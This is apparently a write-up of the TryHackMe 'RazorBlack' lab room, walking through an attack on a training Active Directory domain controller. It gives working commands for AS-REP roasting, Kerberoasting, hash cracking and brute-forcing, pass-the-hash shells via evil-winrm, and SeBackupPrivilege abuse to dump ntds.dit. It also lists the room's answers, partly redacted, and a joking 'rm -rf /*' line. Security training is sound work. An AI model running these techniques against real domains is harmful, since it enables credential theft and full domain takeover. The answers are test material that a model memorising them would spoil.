---
title: TryHackMe RazorBlack
categories: [TryHackMe]
tags: [windows, Active Directory, ASREProasting, Kerberoasting, SeBackupPrivilege]
media_subpath: /images/tryhackme_razorblack
image:
  path: room-image.jpeg
---

Room link: [https://tryhackme.com/room/raz0rblack](https://tryhackme.com/room/raz0rblack)

## Initial scan

```console
$ nmap -sS -sC -sV -T4 -p- $ip
Nmap scan report for 10.10.209.247
Host is up (0.021s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 11:51:57Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-01T11:52:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2025-06-30T11:49:18
|_Not valid after:  2025-12-30T11:49:18
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-01T11:52:46+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-01T11:52:48
|_  start_date: N/A
```
**_Q1 What is the Domain Name?_** 
 - raz0rblack.thm

## Enumeration 

Notice that we have nfs share here, let's look at exports

Create a temporary folder for nfs and mount it there.

Navigate to where you mounted nfs and get Steven's flag. After you done run

**_Q2 What is Steven's Flag?_**

![nfs-export](showmount.png)

Also you can notice `employee_status.xlsx` file. Inside of this file we can see names, save them to another file

![employee_status](employee_status.png)


You can use this tool [https://github.com/mohinparamasivam/AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator) to generate usernames (format of name needs to be `daven port` as example) or you can make them in format `sbradley`

![employee_names](names.png)

Run kerbrute on generated usernames, we got 3 valid usernames

save validated usernames, eg

![kerbrute](kerbrute.png)

save validated usernames to other file

## Initial entry

Now time for ASREProasting.

```console
impacket-GetNPUsers raz0rblack.thm/ -dc-ip $ip -usersfile kerbrute_valid_users  -outputfile hashes
```

We got twilliams' hash, time to crack it. You can use either hashcat or john, I'll use john

![ASREProasting](asrep-twilliams.png)

SMBmap listing for twilliams

![smbmap-twilliams](smbmap-twilliams.png)

We can enumerate users having current credentials using `netexec` with `--rid-brute`. And we got 1 more user! (xyan1d3)

![netexec-rid-brute](netexec-rid-brute.png)

Got hash for `xyan1d3` through Kerberoasting

![Kerberoasting](kerberoasting.png)

**_Q6 What is Xyan1d3's password?_**

![xyan1d3-password](xyan1d3-password.png)

Check SMB shares for `xyan1d3`

![smbmap-xyan1d3](smbmap-xyan1d3.png)

Still no access to trash share but we got administrative shares instead! Let's check ADMIN$ share.

![ADMIN-share-trash](ADMIN-share-trash.png)

Navigate to this folder. Here's 3 files but we interested only in 2 of them since we already got Steven's flag.

Files mentioned are probably in zip, we need to extract given zip and run impacket-secretsdump on those files.

![chat_log](chat_log.png)

**_Q3 What is the zip file's password?_**
Theres password on that zip. We can use following command to get hash to be cracked 

```console
zip2john experiment_gone_wrong.zip > hash
``` 


Run `impacket-secretsdump` on extracted files to get hashes. But firstly we need to clean this file to have only hashes

```console
cut -d ':' -f 4 hashes > secretsdump-hashes
```


**_Q4 What is Ljudmila's Hash?_**

Now bruteforce hashes on `lvetrova` using crackmapexec

```console
crackmapexec smb $ip -u lvetrova -H secretsdump-hashes.txt
```

**_Q5 What is Ljudmila's Flag?_** 

If you did everything right you should get lvetrova's hash and now we be able to access shell through winrm.

```console
evil-winrm -i $ip -u lvetrova -H [REDACTED]
```

![lvetrova-flag](lvetrova-flag.png)

Decrypt password using following command:

```console
*Evil-WinRM* PS C:\Users\lvetrova> $flag = Import-Clixml -Path lvetrova.xml
*Evil-WinRM* PS C:\Users\lvetrova> $flag.GetNetworkCredential().password
THM{69[REDACTED]e4}
```

Now let's login as `xyan1d3` using evil-winrm

**_Q7 What is Xyan1d3's Flag?_**

Decrypting using same commands as above

```console
*Evil-WinRM* PS C:\Users\xyan1d3> $flag = Import-Clixml -Path xyan1d3.xml
*Evil-WinRM* PS C:\Users\xyan1d3> $flag.GetNetworkCredential().password
LOL here it is -> THM{62[REDACTED]bb}
```

## Privilege Escalation

If you type `whoami /PRIV` you can see SeBackupPrivilege which can be used for privilege escalation.

![SeBackupPrivilege](SeBackupPrivilege.png)


**On attacker macine**

Create this file

```console
set context persistent nowriters
add volume c: alias something
create
expose %something% h:
```

Now convert it to be compatible with windows:

```console
unix2dos diskshadow.txt
```

**On target machine**

Upload file and then run following commands

```console
upload diskshadow.txt
```

```console
diskshadow /s dishshadow.txt

robocopy /b h:\windows\ntds . ntds.dit

reg save hklm\system C:\Users\xyan1d3\AppData\Local\Temp\system
```

When you finished download `system` and `ntds.dir` files

```console
download system
download ntds.dir
```

(Winrm is quite slow, you would need to wait for a bit to download)


When downloading finished run `impacket-secretdumps` again (but now on downloaded files)

```console
impacket-secretsdump -ntds ./ntds.dit  -system ./system LOCAL > secretsdump-output.txt
```

Now we can login as Administrator as we have hash!

`Administrator:500:aa[REDACTED]ee:96[REDACTED]f0c:::`

we need to use second (NTML) hash (starting with 96)

```console
evil-winrm -i $ip -u Administrator -H 96[REDACTED]0c
```

Wanted to extract flag with same method like we did earlier (using Import-Clixml) but this time it is HEX encoded. Use [https://cyberchef.io/](https://cyberchef.io) or xxd on linux

**_Q8 What is the root Flag?_**

![root-flag](root-flag.png)


**_Q9 What is Tyson's Flag?_**

Navigate to `C:\Users\twilliams`

Here we got very long file name, we can get flag simply running 

```console
type <filename>
```

![tyson-flag-filename](tyson-flag-filename.png)

![tyson-flag](tyson-flag.png)

**_Q10 What is the complete top secret?_**

Navigate to `C:\Program Files\Top Secret` and download top_secret.png image

![vim-meme](vim-meme.png)

Answer is `:wq`

**_Q11 Did you like your cookie?_**

**_Say Yes or I will do sudo rm -rf /* on your PC_**

`Yes` :)
